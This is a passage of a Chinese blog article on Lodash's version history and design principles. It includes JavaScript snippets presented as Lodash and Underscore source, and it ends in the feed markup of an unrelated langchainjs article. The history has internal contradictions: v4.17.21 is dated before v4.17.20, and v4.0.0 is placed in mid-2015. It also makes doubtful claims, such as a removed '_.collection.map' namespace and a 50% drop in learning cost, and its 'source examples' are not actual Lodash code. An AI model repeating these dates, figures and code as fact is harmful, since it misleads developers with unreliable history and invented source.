<li>新增差异化功能：如 <code>_.cloneDeep</code>（深拷贝）、<code>_.get</code>（对象路径取值）等 Underscore 缺失的高频能力。</li>
</ul>
<h4 data-id="heading-8">v1.x 阶段（2013 年）：模块化与跨环境适配</h4>
<ul>
<li>2013 年加入 Dojo 基金会，获得社区资源支持，开始规范化发展；</li>
<li>核心突破：引入<strong>模块化设计</strong>，支持 AMD（RequireJS）、CommonJS 等模块化规范，适配 Node.js 与浏览器双环境；</li>
<li>性能优化升级：为不同数据类型（数组 / 对象 / 类数组）提供专用遍历逻辑，避免通用逻辑的冗余判断；</li>
<li>新增功能：函数防抖节流（<code>_.debounce</code>/<code>_.throttle</code>）、对象深度比较（<code>_.isEqual</code> 升级）等。</li>
</ul>
<h4 data-id="heading-9">v2.x 阶段（2014 年）：链式调用与惰性求值</h4>
<ul>
<li>核心特性：引入<strong>惰性求值</strong>（lazy evaluation）机制，优化链式调用性能 —— 仅在调用 <code>value()</code> 时才执行所有链式操作，而非每一步都立即计算；</li>
<li>API 一致性强化：统一所有方法的参数顺序为 “<strong>数据在前，操作在后</strong>”，彻底解决 Underscore 的参数混乱问题；</li>
<li>边界处理完善：对 <code>null</code>/<code>undefined</code> 等空值做统一兼容，如 <code>_.map(null)</code> 返回空数组，避免报错；</li>
<li>社区影响力扩大：开始被 React、Angular 等主流框架推荐，成为前端项目的 “标配依赖”。</li>
</ul>
<h3 data-id="heading-10">爆发期：性能革命与生态扩张（2015 年，v3.x）</h3>
<p>2015 年是 Lodash 发展的关键转折点，v3.x 版本的发布使其彻底超越 Underscore，成为前端工具库的绝对领导者。</p>
<h4 data-id="heading-11">v3.0.0（2015 年 1 月）：性能巅峰与功能全覆盖</h4>
<ul>
<li>性能突破：核心方法性能再提升 30-50%，部分场景（如大数据量 <code>_.filter</code>）性能是 Underscore 的 10 倍以上；</li>
<li>新增 47 个新方法：如数学工具（<code>_.add</code>/<code>_.multiply</code>）、字符串操作（<code>_.startsWith</code>/<code>_.endsWith</code>）、集合高级处理（<code>_.flatMap</code>）等；</li>
<li>链式调用增强：支持隐式链式调用（<code>_(value).map(...).filter(...)</code>），简化语法；</li>
<li>工具链升级：推出 <code>lodash-cli</code>，支持定制化构建（如仅保留数组操作方法，减小打包体积）。</li>
</ul>
<h4 data-id="heading-12">2015 年重大里程碑</h4>
<ul>
<li>成为 <strong>npm 上依赖最多的包</strong>，超过 Express、React 等核心框架；</li>
<li>npm 下载量突破 10 亿次，全球超过 300 万项目直接依赖；</li>
<li>与 Underscore 开始 “合并讨论”，部分 Underscore 贡献者开始向 Lodash 迁移，甚至推动 Underscore 向 Lodash 看齐；</li>
<li>推出 <code>lodash-fp</code> 分支，提供函数式编程风格的 API（自动柯里化、参数顺序反转），适配 Ramda 等函数式库的用户习惯。</li>
</ul>
<h3 data-id="heading-13">重构期：API 革新与生态分化（2015 年 6 月，v4.0.0）</h3>
<p>v4.0.0 是 Lodash 历史上最具争议也最具远见的版本，它放弃了对 Underscore 的 API 兼容，进行了彻底的 API 重构，奠定了现代 Lodash 的基础。</p>
<h4 data-id="heading-14">核心重构内容</h4>



































<table><thead><tr><th>重构方向</th><th>具体变化</th><th>影响</th></tr></thead><tbody><tr><td><strong>移除嵌套命名空间</strong></td><td>如 <code>_.collection.map</code> → <code>_.map</code>，所有方法直接挂载到 <code>_</code> 上</td><td>简化调用，降低学习成本</td></tr><tr><td><strong>API 去冗余</strong></td><td>移除 <code>_.pluck</code>（用 <code>_.map</code> 替代）、<code>_.compose</code>（用 <code>_.flowRight</code> 替代）等模糊方法</td><td>统一功能入口，减少方法数量</td></tr><tr><td><strong>参数规范化</strong></td><td>所有方法严格遵循 “数据在前，操作在后”，如 <code>_.sortBy(collection, iteratee)</code></td><td>彻底解决参数混乱问题</td></tr><tr><td><strong>模块化深度优化</strong></td><td>支持 ES6 Module，推出独立的 <code>lodash-es</code> 包，适配现代打包工具（Webpack/Rollup）</td><td>支持按需导入，大幅减小打包体积</td></tr><tr><td><strong>性能再优化</strong></td><td>重写底层工具函数，引入 “类型预判缓存”，进一步提升执行效率</td><td>保持性能领先优势</td></tr></tbody></table>
<h4 data-id="heading-15">争议与适应</h4>
<ul>
<li>短期影响：部分依赖 Underscore 兼容 API 的项目无法直接升级，出现 “Lodash 3 兼容版” 分支；</li>
<li>长期价值：API 一致性达到新高度，学习成本降低 50%，吸引更多新开发者使用；</li>
<li>生态分化：<code>lodash-es</code> 成为现代前端项目的首选，而 <code>lodash</code> 保持 CommonJS 规范，适配 Node.js 与老旧项目。</li>
</ul>
<h3 data-id="heading-16">稳定期：持续迭代与基础设施化（2016-2025 年，v4.x 长期维护）</h3>
<p>v4.0.0 之后，Lodash 进入 “<strong>功能完善 + 安全维护</strong>” 的稳定期，版本号从 v4.0.0 逐步迭代到 v4.17.21（2020 年 2 月），期间未引入破坏性变更。</p>
<h4 data-id="heading-17">核心发展方向</h4>
<ul>
<li>
<p><strong>生态完善</strong>：</p>
<ul>
<li><code>lodash-es</code> 成为主流：适配 ES6 模块化，支持 Tree-shaking，解决 “Lodash 打包体积大” 的痛点；</li>
<li>推出 <code>lodash.cli</code>/<code>lodash-webpack-plugin</code> 等工具，支持定制化构建，最小化打包体积；</li>
<li>适配 ES6+ 新特性：支持 <code>Map</code>/<code>Set</code>/<code>Symbol</code> 等原生类型，新增 <code>_.isMap</code>/<code>_.isSymbol</code> 等判断方法。</li>
</ul>
</li>
<li>
<p><strong>安全与兼容性</strong>：</p>
<ul>
<li>持续修复安全漏洞（如原型污染），成为 npm 生态中最安全的核心依赖之一；</li>
<li>兼容范围扩大：支持 IE9+、Node.js 6+ 等主流环境，同时为现代环境提供原生 API 复用能力；</li>
<li>2019 年通过 jQuery 基金会、JS 基金会，最终加入 OpenJS 基金会，获得长期社区支持。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-18">里程碑事件（2020-2025 年）</h4>
<ul>
<li>2020 年 8 月发布 v4.17.20，之后进入 “安全维护模式”，仅修复严重漏洞；</li>
<li>2025 年 10 月，Sovereign Tech Agency 宣布投资 Lodash，支持其 “功能完成 + 长期稳定” 战略，确保其作为前端基础设施的可持续性；</li>
<li>截至 2025 年，Lodash 每周 npm 下载量超过 2.57 亿次，全球 930 万 + 网站使用，包括三分之一的全球 Top10000 网站；</li>
<li>v5.0.0 规划：<strong>计划移除对老旧环境的支持（如 IE），全面采用 ES2015+ 语法，进一步优化性能与体积，预计 2026 年后发布</strong>。</li>
</ul>
<h3 data-id="heading-19">Lodash 发展的核心驱动力与启示</h3>
<h4 data-id="heading-20">四大核心驱动力</h4>

























<table><thead><tr><th>驱动力</th><th>具体体现</th></tr></thead><tbody><tr><td><strong>性能优先</strong></td><td>从 v0.x 到 v4.x，每一次核心方法重写都以性能为第一目标，这是其超越 Underscore 的关键</td></tr><tr><td><strong>API 一致性</strong></td><td>坚持 “数据在前，操作在后” 的参数顺序，统一返回值规则，降低学习与使用成本</td></tr><tr><td><strong>跨环境适配</strong></td><td>最早支持浏览器 / Node.js 双环境，适配模块化规范，成为 “前后端通用工具库”</td></tr><tr><td><strong>社区协同</strong></td><td>加入基金会、与 Underscore 贡献者协作、接受社区反馈，形成良性发展循环</td></tr></tbody></table>
<h4 data-id="heading-21">对前端生态的启示</h4>
<ul>
<li><strong>工具库设计范式</strong>：Lodash 的 “无侵入式设计”（不修改原生对象原型）、“边界容错” 等原则成为现代工具库的设计标准；</li>
<li><strong>性能优化方法论</strong>：为不同数据类型提供专用逻辑、惰性求值、缓存优化等策略，被广泛应用于 React/Vue 等框架的源码中；</li>
<li><strong>模块化与按需加载</strong>：<code>lodash-es</code> 与 Tree-shaking 的结合，推动前端生态向 “轻量化” 方向发展；</li>
<li><strong>生态协作模式</strong>：从 “竞争” 到 “融合”（与 Underscore 的合并讨论），体现了开源社区的协作精神。</li>
</ul>
<h2 data-id="heading-22">Lodash 的核心设计原则</h2>
<h3 data-id="heading-23">性能优先</h3>
<p>Lodash 把 “性能” 作为第一优先级，所有核心方法的实现都围绕 “最小化执行开销、最大化执行效率” 展开，甚至为了性能牺牲部分 “语法优雅性”（比如放弃原生高阶函数，改用底层循环）。</p>
<h4 data-id="heading-24">核心优化策略</h4>





























<table><thead><tr><th>优化方向</th><th>具体实现逻辑</th></tr></thead><tbody><tr><td>底层遍历：放弃原生高阶函数</td><td>核心遍历方法（如 <code>_.each</code>/<code>_.map</code>）不用 <code>Array.prototype.forEach</code>/<code>map</code>，改用原生 <code>for</code> 循环（减少函数调用栈开销、避免闭包损耗）；</td></tr><tr><td>类型预判：提前分支处理</td><td>执行核心逻辑前，先精准判断数据类型（数组 / 类数组 / 对象 / Map/Set），为不同类型选择最优执行路径，避免通用逻辑的冗余判断；</td></tr><tr><td>惰性求值：延迟计算</td><td><code>_.chain</code> 链式调用采用 “惰性执行”—— 仅在调用 <code>value()</code> 时才执行所有链式操作，而非每一步都立即计算，减少中间步骤的性能损耗；</td></tr><tr><td>缓存优化：避免重复计算</td><td>对高频调用 / 高开销方法（如 <code>_.memoize</code>/<code>_.cloneDeep</code>）提供缓存能力，或提前缓存常用常量（如空对象、空数组）；</td></tr><tr><td>减少冗余操作：精准边界判断</td><td>避免无意义的遍历 / 计算（如对空数组直接返回，对长度为 1 的数组跳过循环）；</td></tr></tbody></table>
<h4 data-id="heading-25">源码实例：<code>_.each</code> 的性能优化（对比 Underscore）</h4>
<h5 data-id="heading-26">Underscore 的 <code>_.each</code>（低效实现）</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Underscore 仅做通用遍历，无类型预判，直接复用原生逻辑</span>
_.<span class="hljs-property">each</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">obj, iteratee</span>) {
  iteratee = <span class="hljs-title function_">optimizeCb</span>(iteratee);
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(obj)) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>, l = obj.<span class="hljs-property">length</span>; i &lt; l; i++) <span class="hljs-title function_">iteratee</span>(obj[i], i, obj);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> obj) {
      <span class="hljs-keyword">if</span> (_.<span class="hljs-title function_">has</span>(obj, key)) <span class="hljs-title function_">iteratee</span>(obj[key], key, obj);
    }
  }
  <span class="hljs-keyword">return</span> obj;
};
</code></pre>
<h5 data-id="heading-27">Lodash 的 <code>_.each</code>（性能优化版）</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Lodash 先做精细类型预判，为不同类型选最优遍历方式</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">each</span>(<span class="hljs-params">collection, iteratee</span>) {
  <span class="hljs-keyword">const</span> func = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(collection)
    ? arrayEach <span class="hljs-comment">// 数组专用遍历（纯 for 循环，无额外判断）</span>
    : <span class="hljs-title function_">isPlainObject</span>(collection)
      ? objectEach <span class="hljs-comment">// 纯对象专用遍历（Object.keys + for 循环）</span>
      : <span class="hljs-title function_">isMap</span>(collection)
        ? mapEach <span class="hljs-comment">// Map 专用遍历（原生 forEach，适配 Map 特性）</span>
        : <span class="hljs-title function_">isSet</span>(collection)
          ? setEach <span class="hljs-comment">// Set 专用遍历</span>
          : baseEach; <span class="hljs-comment">// 兜底通用遍历</span>

  <span class="hljs-keyword">return</span> <span class="hljs-title function_">func</span>(collection, iteratee);
}

<span class="hljs-comment">// 数组专用遍历：极致精简的 for 循环（无冗余判断）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">arrayEach</span>(<span class="hljs-params">array, iteratee</span>) {
  <span class="hljs-keyword">let</span> index = -<span class="hljs-number">1</span>;
  <span class="hljs-keyword">const</span> length = array.<span class="hljs-property">length</span>;
  <span class="hljs-comment">// 提前判断长度，空数组直接返回（减少循环开销）</span>
  <span class="hljs-keyword">while</span> (++index &lt; length) {
    <span class="hljs-comment">// 迭代器返回 false 时立即终止循环（额外性能优化）</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">iteratee</span>(array[index], index, array) === <span class="hljs-literal">false</span>) {
      <span class="hljs-keyword">break</span>;
    }
  }
  <span class="hljs-keyword">return</span> array;
}
</code></pre>
<h5 data-id="heading-28">该原则解决的核心问题</h5>
<ul>
<li>解决 Underscore 等库 “通用逻辑导致的性能损耗”；</li>
<li>适配大数据量场景（如上万条数据的遍历 / 处理）；</li>
<li>平衡 “功能丰富性” 与 “执行效率”，避免 “大而慢”。</li>
</ul>
<h3 data-id="heading-29">API 一致性</h3>
<p>Lodash 重新定义了工具库的 API 设计规范，通过 “统一的规则” 让开发者无需记忆复杂的参数、返回值逻辑，大幅降低学习和使用成本 —— 这也是 Lodash 比 Underscore 更易用的核心原因。</p>
<h4 data-id="heading-30">核心统一规则</h4>
<h5 data-id="heading-31">参数顺序统一：“数据在前，操作在后”</h5>
<p>所有方法遵循 <code>(collection/value, iteratee/options, [thisArg])</code> 的参数顺序：</p>
<ul>
<li>第一参数：待处理的 “数据”（数组 / 对象 / 函数等）；</li>
<li>第二参数：对数据的 “操作”（迭代器 / 配置项等）；</li>
<li>可选第三参数：迭代器的 <code>this</code> 上下文；</li>
</ul>
<p><strong>反例（Underscore）</strong> ：部分方法参数混乱（如 <code>_.sortBy</code> 是 <code>(collection, iteratee)</code>，而早期 <code>_.curry</code> 是 <code>(fn, arity)</code>，无统一逻辑）；<strong>正例（Lodash）</strong> ：<code>_.map(array, fn)</code>、<code>_.filter(object, fn)</code>、<code>_.each(set, fn)</code> 均遵循 “数据在前”。</p>
<h5 data-id="heading-32">返回值规则统一</h5>

























<table><thead><tr><th>方法类型</th><th>返回值规则</th></tr></thead><tbody><tr><td>修改类方法</td><td>返回<strong>新对象 / 新数组</strong>（如 <code>_.assign</code>/<code>_.map</code>），不修改原数据（无副作用）；</td></tr><tr><td>判断类方法</td><td>返回布尔值（如 <code>_.isEmpty</code>/<code>_.isEqual</code>），且判断逻辑 “全域统一”；</td></tr><tr><td>遍历类方法</td><td>返回原数据（如 <code>_.each</code>），支持链式调用；</td></tr><tr><td>取值类方法</td><td>返回目标值（如 <code>_.get</code>），无值时返回默认值（避免返回 <code>undefined</code>）；</td></tr></tbody></table>
<h5 data-id="heading-33">边界处理统一</h5>
<p>所有方法对 <code>null</code>/<code>undefined</code>/ 空值等边界情况做统一兼容，避免开发者手动加判断：</p>
<ul>
<li><code>_.get(obj, 'a.b.c', 'default')</code>：即使 <code>obj.a</code> 不存在，也不会报错，返回默认值；</li>
<li><code>_.map(null, fn)</code>：直接返回空数组，而非抛出 TypeError；</li>
<li><code>_.each(undefined, fn)</code>：直接返回 <code>undefined</code>，无报错。</li>
</ul>
<h5 data-id="heading-34">命名规则统一</h5>
<ul>
<li>语义化命名：方法名直接体现功能（如 <code>_.cloneDeep</code> 明确是 “深拷贝”，而非 Underscore 仅有的 <code>_.clone</code> 浅拷贝）；</li>
<li>扁平化命名：<strong>v4 版本移除嵌套命名空间</strong>（如 <code>_.collection.map</code> → <code>_.map</code>），所有方法直接挂载到 <code>_</code> 上；</li>
<li>前缀统一：判断类方法均以 <code>is</code> 开头（<code>_.isArray</code>/<code>_.isPlainObject</code>），操作类方法无冗余前缀。</li>
</ul>
<h4 data-id="heading-35">源码实例：<code>_.get</code> 的边界处理一致性</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Lodash _.get 核心逻辑：统一处理 null/undefined，返回默认值</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">object, path, defaultValue</span>) {
  <span class="hljs-comment">// 先判断对象是否为 null/undefined，直接返回默认值（统一边界）</span>
  <span class="hljs-keyword">const</span> result = object == <span class="hljs-literal">null</span> ? <span class="hljs-literal">undefined</span> : <span class="hljs-title function_">baseGet</span>(object, path);
  <span class="hljs-comment">// 结果为 undefined 时返回默认值，否则返回结果（统一返回规则）</span>
  <span class="hljs-keyword">return</span> result === <span class="hljs-literal">undefined</span> ? defaultValue : result;
}
</code></pre>
<h4 data-id="heading-36">该原则解决的核心问题</h4>
<ul>
<li>解决 Underscore API 混乱导致的 “记忆成本高、易出错”；</li>
<li>降低团队协作成本（所有人遵循同一套 API 规则）；</li>
<li>提升代码可维护性（方法行为可预判）。</li>
</ul>
<h3 data-id="heading-37">跨环境兼容</h3>
<p>Lodash 从 v1 开始就瞄准 “全环境适配”，是最早同时支持浏览器、Node.js 的工具库之一，其兼容逻辑并非 “简单的降级”，而是 “在不同环境下提供一致的 API 行为”。</p>
<h4 data-id="heading-38">兼容范围与实现策略</h4>





























<table><thead><tr><th>兼容维度</th><th>具体实现逻辑</th></tr></thead><tbody><tr><td>浏览器兼容（IE6+）</td><td>对老旧浏览器的缺失 API 做降级实现（如 <code>Array.isArray</code>/<code>Object.keys</code>）；抹平不同浏览器的 DOM / 事件 API 差异；</td></tr><tr><td>Node.js 兼容</td><td>适配 Node.js 特有数据类型（<code>Buffer</code>/<code>Stream</code>/<code>process</code>）；支持 CommonJS 模块化（<code>require('lodash')</code>）；</td></tr><tr><td>模块化规范兼容</td><td>支持 AMD（RequireJS）、CommonJS、ES6 Module（<code>lodash-es</code>）三大模块化规范；</td></tr><tr><td>原生 API 兼容</td><td>适配 ES6+ 新特性（<code>Map</code>/<code>Set</code>/<code>Symbol</code>），新增 <code>_.isMap</code>/<code>_.isSymbol</code> 等方法；兼容原生方法的行为（如 <code>_.assign</code> 对齐 <code>Object.assign</code>）；</td></tr><tr><td>运行时环境兼容</td><td>适配 Electron、React Native 等跨端环境，抹平端侧 API 差异；</td></tr></tbody></table>
<h4 data-id="heading-39">源码实例：<code>_.isArray</code> 的跨环境兼容</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Lodash _.isArray 兼容逻辑：优先复用原生 API，无则降级实现</span>
<span class="hljs-keyword">const</span> isArray = <span class="hljs-title class_">Array</span>.<span class="hljs-property">isArray</span> || <span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-comment">// 老旧浏览器降级：通过 toString 判断类型（IE6+ 兼容）</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span> &amp;&amp;
    value !== <span class="hljs-literal">null</span> &amp;&amp;
    <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(value) === <span class="hljs-string">'[object Array]'</span>;
};
</code></pre>
<h4 data-id="heading-40">关键设计：“渐进式兼容” 而非 “一刀切”</h4>
<p>Lodash 不会为了兼容老旧环境牺牲现代环境的性能：</p>
<ul>
<li>现代环境（Chrome/Firefox/Node.js 14+）：优先复用原生 API（如 <code>Array.prototype.flat</code>）；</li>
<li>老旧环境（IE6/Node.js 6-）：自动降级为纯 JS 实现；</li>
<li>开发者可通过 <code>lodash-cli</code> 定制构建，移除无需的兼容逻辑（如仅支持现代浏览器时，剔除 IE 兼容代码）。</li>
</ul>
<h4 data-id="heading-41">该原则解决的核心问题</h4>
<ul>
<li>避免开发者为不同环境编写 “环境适配层”；</li>
<li>让同一套代码可运行在浏览器、Node.js、跨端环境；</li>
<li>降低工具库的 “环境迁移成本”（如从浏览器项目迁移到 Node.js 项目，无需替换工具库）。</li>
</ul>
<h3 data-id="heading-42">功能全覆盖</h3>
<p>Lodash 遵循 “一站式” 设计理念，覆盖前端开发从 “基础数据处理” 到 “工程化优化” 的所有高频场景，避免开发者混用多个工具库（如 Underscore + jQuery + 自定义工具函数）。</p>
<h4 data-id="heading-43">功能分层</h4>

























<table><thead><tr><th>功能层</th><th>覆盖场景</th><th>核心方法示例</th></tr></thead><tbody><tr><td>基础层</td><td>数组 / 对象 / 字符串 / 数字 / 日期的通用操作</td><td><code>_.each</code>/<code>_.map</code>/<code>_.keys</code>/<code>_.trim</code></td></tr><tr><td>增强层</td><td>函数控制、数据深度操作、集合高级处理</td><td><code>_.debounce</code>/<code>_.cloneDeep</code>/<code>_.get</code></td></tr><tr><td>工程层</td><td>类型判断、数据验证、惰性求值、模块化导出</td><td><code>_.isPlainObject</code>/<code>_.chain</code>/<code>_.memoize</code></td></tr></tbody></table>
<h4 data-id="heading-44">核心功能覆盖</h4>
<p>Lodash 不仅复刻 Underscore 的核心功能，还补充了大量高频且原生 JS 缺失的能力：</p>








































<table><thead><tr><th>缺失的原生能力</th><th>Lodash 解决方案</th><th>解决的核心问题</th></tr></thead><tbody><tr><td>深拷贝</td><td><code>_.cloneDeep</code></td><td>原生仅能浅拷贝（<code>Object.assign</code>）；</td></tr><tr><td>对象路径取值 / 赋值</td><td><code>_.get</code>/<code>_.set</code></td><td>原生需多层 <code>&amp;&amp;</code> 判断（<code>obj?.a?.b</code> 是 ES2020 后才支持）；</td></tr><tr><td>防抖节流（高级配置）</td><td><code>_.debounce</code>/<code>_.throttle</code></td><td>原生需手动实现，且无 “立即执行”“取消” 等配置；</td></tr><tr><td>数据深度比较</td><td><code>_.isEqual</code></td><td>原生仅能比较引用（<code>===</code>），无法比较对象内容；</td></tr><tr><td>函数柯里化 / 组合</td><td><code>_.curry</code>/<code>_.flow</code></td><td>原生无内置函数式编程工具；</td></tr><tr><td>集合惰性遍历</td><td><code>_.chain</code></td><td>原生链式调用需手动拼接，无惰性求值；</td></tr></tbody></table>
<h4 data-id="heading-45">设计细节</h4>
<p>Lodash 的功能设计遵循 “符合开发者直觉”：</p>
<ul>
<li>方法行为与命名高度一致（如 <code>_.map</code> 对数组 / 对象 / Map 的处理逻辑 “语义一致”）；</li>
<li>新增方法时，优先复用已有参数规则（如 <code>_.filter</code> 与 <code>_.map</code> 的参数顺序完全一致）；</li>
<li>避免 “隐藏行为”（如修改原数据、静默失败），所有副作用均明确告知。</li>
</ul>
<h4 data-id="heading-46">该原则解决的核心问题</h4>
<ul>
<li>减少项目依赖数量（无需引入多个工具库）；</li>
<li>降低 “工具函数碎片化”（避免团队每个人都写自己的深拷贝 / 防抖函数）；</li>
<li>提升代码一致性（全项目使用同一套工具方法）。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[langchainjs&langgraphjs入门(一)简介和模型调用]]></title>    <link>https://juejin.cn/post/7594315259462746147</link>    <guid>https://juejin.cn/post/7594315259462746147</guid>    <pubDate>2026-01-13T01:50:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594315259462746147" data-draft-id="7594310266411057152" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="langchainjs&amp;langgraphjs入门(一)简介和模型调用"/> <meta itemprop="keywords" content="LangChain,Node.js,AI编程"/> <meta itemprop="datePublished" content="2026-01-13T01:50:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="The_massif"/> <meta itemprop="url" content="https://juejin.cn/user/3620050680165784"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            langchainjs&amp;langgraphjs入门(一)简介和模型调用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3620050680165784/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    The_massif
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:50:24.000Z" title="Tue Jan 13 2026 01:50:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">langchain &amp; langgraph</h2>
<h3 data-id="heading-1">简介</h3>
